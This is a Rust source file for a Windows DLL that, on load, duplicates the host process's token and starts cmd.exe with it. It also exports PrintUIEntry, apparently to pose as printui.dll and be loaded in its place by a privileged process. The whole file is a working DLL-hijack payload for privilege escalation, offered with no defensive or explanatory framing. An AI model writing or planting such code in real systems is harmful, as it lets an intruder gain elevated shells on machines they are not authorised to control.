use windows::core::PWSTR;
use windows::core::w;  // Import the macro
use windows::Win32::System::SystemServices::DLL_PROCESS_ATTACH;
use windows::Win32::Foundation::{HANDLE, HINSTANCE, CloseHandle, GetLastError};
use windows::Win32::Security::{TOKEN_QUERY, TOKEN_DUPLICATE, TOKEN_ALL_ACCESS, SecurityImpersonation, DuplicateTokenEx};
use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken, CreateProcessAsUserW, PROCESS_INFORMATION, STARTUPINFOW, CREATE_NEW_CONSOLE};


fn start_shell() {
    unsafe {
        let mut token_handle: HANDLE = HANDLE::default();
        let current_process = GetCurrentProcess();

        // Open the access token for the current process
        if OpenProcessToken(current_process, TOKEN_QUERY | TOKEN_DUPLICATE, &mut token_handle).is_err() {
            println!("Failed to open process token. Error: {:?}", GetLastError());
            return;
        }

        let mut duplicated_token: HANDLE = HANDLE::default();

        // Duplicate the token to create a new process with the same privileges
        if DuplicateTokenEx(
            token_handle,
            TOKEN_ALL_ACCESS,
            None,
            SecurityImpersonation,
            windows::Win32::Security::TokenPrimary,
            &mut duplicated_token,
        )
        .is_err()
        {
            println!("Failed to duplicate token. Error: {:?}", GetLastError());
            let _ = CloseHandle(token_handle);
            return;
        }

        // Prepare structures for CreateProcessAsUserW
        let mut startup_info: STARTUPINFOW = std::mem::zeroed();
        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

        // Start cmd.exe with the duplicated token
        let cmd = w!("C:\\Windows\\System32\\cmd.exe");

        if CreateProcessAsUserW(
            duplicated_token,
            cmd,
            PWSTR::null(),
            None,
            None,
            false,
            CREATE_NEW_CONSOLE,
            None,
            None,
            &mut startup_info,
            &mut process_info,
        )
        .is_err()
        {
            println!("Failed to start cmd.exe. Error: {:?}", GetLastError());
        }

        // Cleanup handles
        let _ = CloseHandle(duplicated_token);
        let _ = CloseHandle(token_handle);
    }
}

#[no_mangle]
pub extern "system" fn DllMain(_: HINSTANCE, fdw_reason: u32, _lpv_reserved: *const ()) -> u32 {
    if fdw_reason == DLL_PROCESS_ATTACH {
        start_shell();
    }
    1
}

#[no_mangle]
pub extern "system" fn PrintUIEntry(_: isize, _: HINSTANCE, _: *const u8, _: i32) {
    start_shell();
}